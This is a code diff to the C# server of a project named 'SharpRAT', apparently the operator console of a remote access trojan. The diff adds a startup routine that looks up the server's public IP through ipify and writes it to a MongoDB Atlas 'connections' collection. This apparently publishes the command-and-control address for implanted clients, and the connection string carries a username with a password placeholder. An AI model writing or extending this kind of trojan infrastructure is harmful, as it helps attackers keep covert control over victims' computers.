@@ -1,4 +1,7 @@
+using MongoDB.Bson;
+using MongoDB.Driver;
 using Server.Server;
+using System.Net;
 
 namespace Server
 {
@@ -15,6 +18,7 @@ namespace Server
             uiRequests = new RequestUI();
             imageList = new ImageList();
             InitializeComponent();
+            MongoInit();
         }
 
         private void AddUserToViewlist(string text)
@@ -40,7 +44,44 @@ namespace Server
             // Log the new connection.
             Log.Info($"Client {szName} - [{szIPAddress}:{szPort}] connected.");
         }
+        public string ipget()
+        {
+            WebClient webClient = new WebClient();
+            string publicIp = webClient.DownloadString("https://api.ipify.org");
+            Console.WriteLine("My public IP Address is: {0}", publicIp);
+            return publicIp;
 
+        }
+        public void MongoInit()
+        {
+            var client = new MongoClient(
+            "mongodb+srv://Snutri:<ENTERYOURCODEHERE>@sharprat.t4wds.mongodb.net/SharpRAT?retryWrites=true&w=majority");
+            // Create the collection object that represents the "products" collection
+
+            var database = client.GetDatabase("SharpRAT");
+
+            var connections = database.GetCollection<BsonDocument>("connections");
+
+            // Clean up the collection if there is data in there
+
+            database.DropCollection("connections");
+
+            // collections can't be created inside a transaction so create it first
+
+            database.CreateCollection("connections");
+
+            // Create some sample data
+            var newest = new BsonDocument
+            {
+                { "AdminName", "test" },
+                { "CurrentIp", ipget() }
+            };
+
+            // Insert the sample data 
+            connections.InsertOne(newest);
+            return;
+
+        }
         private void RemoveUserFromViewlist(string text)
         {
             int index = int.Parse(text);
